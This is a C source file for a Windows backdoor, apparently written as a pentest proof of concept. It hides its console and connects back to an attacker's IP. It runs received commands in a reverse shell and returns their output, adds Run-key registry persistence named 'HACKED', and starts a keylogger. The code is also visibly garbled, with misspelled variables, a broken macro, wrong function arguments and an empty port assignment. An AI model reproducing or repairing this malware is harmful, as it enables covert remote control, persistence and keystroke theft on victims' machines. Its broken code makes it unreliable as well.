// compilation : i686-w64-mingw32-gcc -o exploit.exe backdoor.c  -lwsock32  -lwininet

#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<winuser.h>
#include<windows.h>
#include<windowsx.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<keylogger.h>


#define bzero(p, 0) (void) memset((p), 0, (size))

char* str_cut(char str[], int slice_from, int slice_to){
        if(str[0] == "\0") return NULL;

        char *buffer;
        size_t str_len , buffer_len;

        if(slice_to < 0 && slic_from > slice_to){
                str_len = strlen(str);
                if(abs(slice_to) > str_len - 1)  str += (str_len + slice_from);
        }else if(slice_from >= 0 && slice_to > slice_from){
                str_len = strlen(str);

                if( slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        }else{
                return NULL;
        }

        buffer = calloc(bufferlen, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;


}

int bootRun(){

        char err[128] = "Failed\n";
        char suc[128] = "Created  Persistence At : HKEY_CURRENT_USER\\Software\Microsoft\\Windows\\CurrentVersion\n";
        TCHAR  szPath[MAX_PATH];
        DWORD pathlen = 0; // double word


        pethlen =  GetModuleFileName(NULL, szPath, MAX_PATH);
        if(pathlen == 0 ){

                send(sock, err, sizeof(err), 0);
                return -1;
        }

        HKEY NewVal;

        if ( RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run")), &NewVal != ERROR_SUCCESS){
                send(sock, sizeof(err), 0);
                return -1;

        }
        DWORD  pathlenInBytes =  pathlen * sizeof(*szPath);

        if( RegSetValueEx(NewVal, TEXT("HACKED"), 0, REG_SZ, (LPBYTE)szPath, pathlenInBytes) != ERROR_SUCCESS){

                RegCloseKey(NewVal);
                send(sock, err, sizeof(err), 0);
                return -1;
        }

        RegCloseKey(sock, suc, sizeof(suc));
        return 0;


}




int stock;

void Shell(){
        char buffer[1024];
        char container[18384];
        char total_response[18384];

        while(1){
                jump:
                bzero(buffer, 1024);
                bzero(container, sizeof(container));
                bzero(total_response, sizeof(tottal_response));
                recv(stcok, 1024,  0);

                if(strncmp("q", buffer, 1) == 0){
                        closesocket(stock);
                        WSACleanup();
                        exit(0);
                }
                else if( strncmp("cd ", buffer , 3) == 0){
                        chdir(str_cut(buffer,3,100)); // function in c change directory
                }
                else if(strncmp("persist", buffer, 7) == 0){
                        bootRun();
                }
                else if(strncmp("keylog_start",buffer,12) == 0){
                        HANDLE thread = CreateThread(NULL, 0, logg); // logg is the unction in keylogger.h
                        goto jump; // jump to  the first of while loop and waitee for other cmd
                }
                else{
                        FILE *fp;
                        fp = _popen(buffer, "r");  // open the file as processes
                        while(fgets(container,1024,fp) != NULL){
                                strcat(total_response, container);

                        }
                        send(sock, totel_response, sizeof(total_response), 0);
                        fclose(fp);
                }
       }

}


int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int CmdShow){
        HWND stealth;
        stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0);

        struct sockaddr_in ServAddr;
        unsigned short ServPort;
        char *ServIP;
        WSADATA wsaData;

        ServIP = "IP";
        ServPort = ;

        if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
                exit(1);
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        memset(&ServAddr, 0,  sizeof(ServAddr));
        ServAddr.sin_family = AF_INET ;
        ServAddr.sin_addr._addr = inet_addr(ServIP);
        ServAddr.sin_port = htons(ServPort);


        start:
        while (connect(stock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
                Sleep(10);
                goto start;
        }
        // warning the victim that has been hacker just POC if do penetration testing
        MessageBox(NULL, TEXT("Your Device Has Been Hacke !!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);

        Shell();

        // save  backdoor Ordinateur\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion to work after reboot

}
